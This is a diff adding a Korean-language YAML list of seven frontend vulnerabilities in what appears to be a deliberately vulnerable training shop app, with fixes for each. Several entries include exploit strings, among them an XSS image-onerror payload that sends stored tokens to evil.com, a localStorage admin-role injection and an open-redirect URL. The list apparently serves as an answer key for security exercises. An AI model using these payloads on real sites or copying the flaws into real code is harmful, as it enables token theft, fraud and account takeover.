@@ -1,0 +1,76 @@
+# Frontend 취약점 목록
+
+vulnerabilities:
+
+  - id: VULN-F1
+    file: src/api.js
+    type: sensitive_storage
+    severity: high
+    description: >
+      JWT 토큰을 localStorage에 저장.
+      XSS 취약점과 결합 시 document 접근 없이도 토큰 탈취 가능.
+    exploit: "localStorage.getItem('token')"
+    fix: "HttpOnly 쿠키 사용"
+
+  - id: VULN-F2
+    file: src/api.js
+    function: login
+    type: information_disclosure
+    severity: medium
+    description: >
+      로그인 응답(JWT 토큰 포함)을 console.log로 출력.
+      개발자 도구 오픈 상태에서 누구나 확인 가능.
+    fix: "console.log 제거"
+
+  - id: VULN-F3
+    file: src/pages/Products.jsx
+    function: handleQuickBuy
+    type: price_manipulation
+    severity: critical
+    description: >
+      빠른 구매 시 사용자가 입력한 금액을 total로 그대로 전송.
+      입력 필드에서 0.01 입력 후 구매 시 $999 상품을 $0.01에 구입 가능.
+      백엔드 BUG-6와 직접 연결됨.
+    fix: "total을 클라이언트에서 계산하지 말고 서버에서만 결정"
+
+  - id: VULN-F4
+    file: src/pages/Admin.jsx / src/AuthContext.jsx
+    type: client_side_auth
+    severity: high
+    description: >
+      관리자 페이지 접근을 클라이언트 role 값으로만 제어.
+      localStorage.setItem("user", JSON.stringify({role:"admin"})) 후
+      새로고침 시 관리자 메뉴 및 페이지 접근 가능.
+      백엔드 BUG-7(JWT alg=none)과 결합하면 실제 API 호출까지 성공.
+    fix: "서버 응답 기반으로만 role 판단, 클라이언트 저장 role 미사용"
+
+  - id: VULN-F5
+    file: src/pages/Login.jsx
+    function: handleSubmit
+    type: open_redirect
+    severity: medium
+    description: >
+      로그인 성공 후 ?redirect= 파라미터를 검증 없이 사용.
+      /login?redirect=https://evil.com 링크 클릭 유도 후 피싱 가능.
+    exploit: "/login?redirect=https://evil.com"
+    fix: "redirect 값이 같은 origin인지 검증"
+
+  - id: VULN-F6
+    file: src/pages/Products.jsx
+    type: xss
+    severity: critical
+    description: >
+      상품 description 필드를 dangerouslySetInnerHTML로 렌더링.
+      관리자 계정 탈취 후 상품 설명에 <img src=x onerror="fetch('https://evil.com?c='+localStorage.getItem('token'))">
+      삽입 시 모든 방문자의 토큰 탈취 가능. VULN-F1과 결합 시 치명적.
+    fix: "DOMPurify로 sanitize 후 렌더링하거나 textContent 사용"
+
+  - id: VULN-F7
+    file: src/pages/Orders.jsx
+    type: idor
+    severity: high
+    description: >
+      주문 취소 시 order_id를 UI에서 직접 입력 가능.
+      타인의 order_id 입력 후 취소 요청 전송.
+      백엔드 BUG-5(중복 환불)와 결합 시 타인 주문 반복 취소로 잔액 고갈 가능.
+    fix: "UI에서 직접 ID 입력 제거, 목록에서만 취소 가능하도록 변경"
